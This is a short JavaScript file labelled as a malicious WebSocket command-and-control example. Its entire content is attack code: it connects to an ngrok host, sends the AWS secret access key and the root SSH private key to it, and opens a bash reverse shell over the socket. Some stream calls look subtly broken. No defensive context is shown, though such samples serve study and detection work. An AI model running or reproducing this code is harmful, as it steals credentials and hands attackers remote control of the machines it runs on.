// Malicious WebSocket C2 example
import WebSocket from 'ws';

// Connect to C2 server
const ws = new WebSocket('wss://abc123.ngrok.io/command');

ws.on('open', () => {
  // Exfiltrate secrets
  ws.send(JSON.stringify({
    awsKey: process.env.AWS_SECRET_ACCESS_KEY,
    sshKey: require('fs').readFileSync('/root/.ssh/id_rsa', 'utf8')
  }));

  // Reverse shell
  const { spawn } = require('child_process');
  const shell = spawn('/bin/bash');
  shell.stdout.pipe(ws);
  ws.pipe(shell.stdin);
  shell.stderr.pipe(ws);
});
